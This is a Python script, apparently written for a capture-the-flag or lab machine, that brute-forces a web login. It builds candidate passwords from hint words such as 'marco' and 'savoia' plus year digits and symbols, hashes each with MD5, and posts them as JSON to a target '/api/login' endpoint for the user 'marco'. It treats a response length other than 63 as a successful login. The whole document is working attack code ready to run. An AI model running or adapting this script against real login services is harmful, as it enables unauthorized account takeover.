#!/usr/bin/env python3

import requests
from hashlib import md5
import os
import time
import sys
import argparse
from colorama import init, Fore

# Coloured
init()
GREEN = Fore.LIGHTCYAN_EX

special_characters = ["!","@","#","$","%","^","&","*","`"]
numbers_lst = ["19", "20", "21","22"]
password_hint = ["marco", "admin", "plane", "savoia"]
password_lst = []
password_pt_lst = []
tried_username = ["marco"]

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="specify uRL include scheme.")

args = parser.parse_args()

def create_password_list():
	# Create Password List from the hint:
	for number in numbers_lst:
		for spec_char in special_characters:
			for ph in password_hint:
				passwords = ph + str(number) + spec_char
				password_lst.append(md5(str(passwords).encode("utf-8")).hexdigest())
				password_pt_lst.append(passwords)

def password_bruteforce(url):
	for index, passwds in enumerate(password_lst):
		passwd_pt_str = password_pt_lst[index] 
		for user in tried_username:
			data = {
				"username":user,
				"password":passwds 
			}

			r = requests.post(url, json=data)
			os.system("clear")
			print("\r{}[*] Trying to login with credentials: {}:{}:{}".format(GREEN, user, passwds, passwd_pt_str), end="")
			if (len(r.text)) != 63:
				print("\n")
				print("-"*30)
				print("{}[*] SUCCESSFULLY LOGIN WITH CREDS: {}:{}".format(GREEN, user, passwd_pt_str))
				time.sleep(1)
				print("[*] Exiting....\n")
				sys.exit()



if __name__ == "__main__":

	create_password_list()

	if args.url:
		try:
			url = args.url
			new_url = url.split("/")
			if new_url[3] != "api" or new_url[4] != "login":
				print("[-] ERROR: Please specify correct uRL\n")
				print("[+] Usage: python3 yotp.py -u http://$IP/api/login\n")
			else:
				url = args.url
				password_bruteforce(url)
		except IndexError:
			print("[-] ERROR: Check if your uRL is correct\n")
			print("[+] Usage: python3 yotp.py -u http://$IP/api/login\n")
	else:
		print("[+] Usage: python3 yotp.py -u http://$IP/api/login\n")

	


			



		





